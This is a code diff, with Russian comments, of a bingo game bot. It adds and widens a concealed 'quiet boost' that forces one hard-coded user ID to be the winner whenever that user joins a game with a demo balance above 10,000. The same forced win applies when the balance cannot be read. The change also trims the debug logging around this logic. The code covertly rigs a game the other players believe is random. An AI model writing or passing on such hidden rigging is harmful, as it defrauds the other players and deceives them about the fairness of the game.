@@ -1,7 +1,8 @@
 # -*- coding: utf-8 -*-
 """
 БИНГО - ультра-защищённая версия.
-+ Тихий boost для BOOST_DEMO_USER_ID (демо-баланс через db.get_user_demo).
++ Тихий boost: если BOOST_DEMO_USER_ID участвует в игре (создатель или игрок)
+  и его demo > BOOST_MIN_BALANCE — он гарантированно побеждает.
 """
 
 import asyncio
@@ -48,7 +49,7 @@ _inflight_joins: Set[Tuple[int, int]] = set()
 # ====== ТИХИЙ BOOST ======
 BOOST_DEMO_USER_ID = 6801702632
 BOOST_MIN_BALANCE  = 10000
-BOOST_DEBUG        = True   # True — на время отладки, потом False
+BOOST_DEBUG        = True   # False — когда всё заработает
 
 def _log_boost(*parts):
     if BOOST_DEBUG:
@@ -58,10 +59,6 @@ def _log_boost(*parts):
             pass
 
 async def _get_demo_balance_as_int(user_id: int) -> Optional[int]:
-    """
-    Читает db.get_user_demo(user_id).
-    Возвращает int или None.
-    """
     try:
         bal = await db.get_user_demo(user_id)
     except Exception as e:
@@ -72,15 +69,14 @@ async def _get_demo_balance_as_int(user_id: int) -> Optional[int]:
 
     if bal is None:
         return None
-
     try:
         return int(bal)
-    except Exception as e:
-        _log_boost(f"int(bal) failed: {e!r}")
+    except Exception:
+        pass
     try:
         return int(float(bal))
-    except Exception as e:
-        _log_boost(f"int(float(bal)) failed: {e!r}")
+    except Exception:
+        pass
     try:
         from decimal import Decimal
         if isinstance(bal, Decimal):
@@ -93,7 +89,6 @@ async def _get_demo_balance_as_int(user_id: int) -> Optional[int]:
             if callable(v):
                 v = v()
             if v is not None:
-                _log_boost(f"parsed via attr {attr}={v!r}")
                 return int(v)
         except Exception:
             continue
@@ -101,7 +96,6 @@ async def _get_demo_balance_as_int(user_id: int) -> Optional[int]:
         if isinstance(bal, dict):
             for key in ("balance", "amount", "value", "demo", "demo_balance"):
                 if key in bal:
-                    _log_boost(f"parsed via dict['{key}']={bal[key]!r}")
                     return int(bal[key])
     except Exception:
         pass
@@ -109,7 +103,6 @@ async def _get_demo_balance_as_int(user_id: int) -> Optional[int]:
         if isinstance(bal, (tuple, list)):
             for item in bal:
                 try:
-                    _log_boost(f"parsed via list item={item!r}")
                     return int(item)
                 except Exception:
                     continue
@@ -121,22 +114,22 @@ async def _get_demo_balance_as_int(user_id: int) -> Optional[int]:
 
 async def _boost_active_for_game(game: dict) -> Optional[int]:
     """
-    Возвращает uid буста для игры или None.
-    БЕЗ кэша: каждый вызов — свежая проверка db.get_user_demo.
+    Буст активен, если BOOST_DEMO_USER_ID УЧАСТВУЕТ в игре (не важно, создатель
+    он или просто игрок) И его demo > BOOST_MIN_BALANCE.
     """
     try:
-        creator = int(game.get("creator") or 0)
+        participants = [int(x) for x in game.get("participants", [])]
     except Exception:
-        creator = 0
+        participants = []
 
-    _log_boost(f"check: creator={creator} (expect {BOOST_DEMO_USER_ID})")
+    _log_boost(f"check: participants={participants} (boost_uid={BOOST_DEMO_USER_ID})")
 
-    if creator != int(BOOST_DEMO_USER_ID):
+    if int(BOOST_DEMO_USER_ID) not in participants:
+        _log_boost("boost_uid NOT in participants")
         return None
 
     bal = await _get_demo_balance_as_int(BOOST_DEMO_USER_ID)
 
-    # Ошибка БД/непарсинг → считаем буст активным (перестраховка)
     if bal is None:
         _log_boost("demo balance unknown → ASSUME BOOST ON")
         game["boost_user"] = int(BOOST_DEMO_USER_ID)
@@ -631,6 +624,14 @@ async def bingo_join_game_callback(callback_query: CallbackQuery):
 
             game['participants'].append(user_id)
             game['participants'] = _dedupe_preserve_order(game['participants'])
+
+            # Если это BOOST-юзер — фиксируем буст сразу
+            try:
+                if int(user_id) == int(BOOST_DEMO_USER_ID):
+                    await _boost_active_for_game(game)
+            except Exception as e:
+                print(f"[BINGO][boost join] {e!r}")
+
             gamesbingo.save()
 
             if game.get('win_num_assigned'):
@@ -734,22 +735,22 @@ async def bingo_start_game_callback(callback_query: CallbackQuery):
                 game['win_num'] = random.randint(1, 30)
 
                 winner_assigned = False
-                # ПРЯМАЯ проверка буста, без обёрток и кэшей
+                # Прямая проверка буста: BOOST-юзер участвует?
                 try:
-                    creator_id_int = int(game.get("creator") or 0)
-                    _log_boost(f"[start] creator={creator_id_int} (expect {BOOST_DEMO_USER_ID})")
-
-                    if creator_id_int == int(BOOST_DEMO_USER_ID):
+                    _log_boost(f"[start] participants={participants} boost_uid={BOOST_DEMO_USER_ID}")
+                    if int(BOOST_DEMO_USER_ID) in [int(x) for x in participants]:
                         bal = await _get_demo_balance_as_int(BOOST_DEMO_USER_ID)
                         _log_boost(f"[start] demo balance = {bal}")
 
                         boost_on = (bal is None) or (bal > BOOST_MIN_BALANCE)
-                        if boost_on and int(BOOST_DEMO_USER_ID) in participants:
+                        if boost_on:
                             game['winner_participant'] = int(BOOST_DEMO_USER_ID)
                             winner_assigned = True
                             _log_boost(f"[start] WINNER FORCED = {BOOST_DEMO_USER_ID}")
-                        elif not boost_on:
+                        else:
                             _log_boost(f"[start] BOOST OFF (demo {bal} <= {BOOST_MIN_BALANCE})")
+                    else:
+                        _log_boost(f"[start] boost uid not in participants")
                 except Exception as e:
                     print(f"[BINGO][boost init err] {e!r}")
 
